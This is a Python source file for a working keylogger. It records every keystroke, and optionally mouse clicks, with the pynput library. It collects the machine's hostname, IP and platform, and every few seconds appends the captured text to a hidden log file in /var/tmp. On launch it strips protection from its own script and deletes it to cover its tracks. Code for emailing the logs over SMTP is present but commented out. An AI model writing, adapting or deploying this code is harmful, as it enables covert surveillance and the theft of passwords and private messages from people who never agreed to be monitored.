from datetime import datetime

try:
    import logging
    import os
    import platform
    import smtplib
    import socket
    import threading
    import wave
    from pynput import keyboard, mouse
except ModuleNotFoundError:
    from subprocess import call

    modules = ['pynput', ]
    call('pip install ' + ' '.join(modules), shell=True)


finally:
    EMAIL_ADDRESS = 'gmail@gmail.com'
    EMAIL_PASSWORD = 'mysecurepassword'
    SEND_REPORT_EVERY = 5  # as seconds
    JUST_CHARS = True

    class KeyLogger:
        def __init__(self, time_interval, email, password, just_chars):
            self.interval = time_interval
            self.log = 'KeyLogger Started on '
            self.email = email
            self.password = password
            self.just_chars = just_chars

        def appendlog(self, string):
            self.log = self.log + string if string else ''

        def on_move(self, x, y):
            """ Commented to keep it clean """
            message = f'[Mouse Moved To {x}-{y}] '
            self.appendlog(message)

        def on_click(self, x, y, *args, **kwargs):
            if args[1] == 1:
                message = f'[{args[0]}] '
                self.appendlog(message)

        def on_scroll(self, x, y, *args, **kwargs):
            """ Commented to keep it clean """
            if args[0] == 0:
                message = '[Scrolling Down] ' if args[1] == -1 else '[Scrolling Up] '
            else:
                message = '[Scrolling Left] ' if args[0] == -1 else '[Scrolling Right] '
            self.appendlog(message)

        def save_data(self, key):
            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.backspace:
                    current_key = '[<-]'
                elif key == key.space:
                    current_key = ' '
                elif key == key.esc:
                    current_key = '[ESC]'
                elif key == key.shift:
                    current_key = '' if self.just_chars else '[SHIFT]'
                elif key == key.caps_lock:
                    current_key = '[CAPSLOCK]'
                elif key == key.alt:
                    current_key = '[ALT]'
                elif key == key.alt_r:
                    current_key = '[ALT_R]'
                elif key == key.ctrl:
                    current_key = '[CTRL]'
                elif key == key.ctrl_r:
                    current_key = '[CTRL_R]'
                elif key == key.up:
                    current_key = '' if self.just_chars else '[UP]'
                elif key == key.down:
                    current_key = '' if self.just_chars else '[DOWN]'
                elif key == key.left:
                    current_key = '' if self.just_chars else '[LEFT]'
                elif key == key.right:
                    current_key = '' if self.just_chars else '[RIGHT]'
                elif key == key.enter:
                    current_key = '[ENTER]\n'
                elif key == key.tab:
                    current_key = '[TAB]'
                else:
                    current_key = str(key)
            self.appendlog(current_key)

        def save_log(self, message):
            if not hasattr(self, 'server'):
                # self.server = smtplib.SMTP(host='smtp.gmail.com', port=587)
                # self.server.starttls()
                # self.server.login(email, password)

                if not message.isspace():
                    message = '\n' + datetime.now().strftime('%Y-%m-%d %H:%M') + ' ' + message
                    print(message)
                    log_file = '/var/tmp/.important.log'
                    with open(log_file, 'a') as f:
                        f.write(message)

                    # self.server.sendmail(email, email, message)

        def report(self):
            self.save_log(self.log)
            self.log = ''
            timer = threading.Timer(self.interval, self.report)
            timer.start()

        def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            self.appendlog(f'{hostname=}')
            self.appendlog(f'{ip=}')
            self.appendlog(f'{plat=}')
            self.appendlog(f'{system=}')
            self.appendlog(f'{machine=}')

        def run(self):
            file_path = os.path.abspath(__file__)
            os.system('chattr -i ' + file_path)
            os.system('rm -rf ' + file_path)
            print('File Removed.')

            self.system_information()
            self.report()
            # mouse_listener = mouse.Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll)
            mouse_listener = mouse.Listener(on_click=self.on_click)
            keyboard_listener = keyboard.Listener(on_press=self.save_data)

            if self.just_chars:
                with keyboard_listener:
                    keyboard_listener.join()
            else:
                with mouse_listener, keyboard_listener:
                    keyboard_listener.join()
                    mouse_listener.join()


    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD, JUST_CHARS)
    try:
        keylogger.run()
    except KeyboardInterrupt:
        print('\n\nBye Bye\nPress (Ctrl + C) Again')
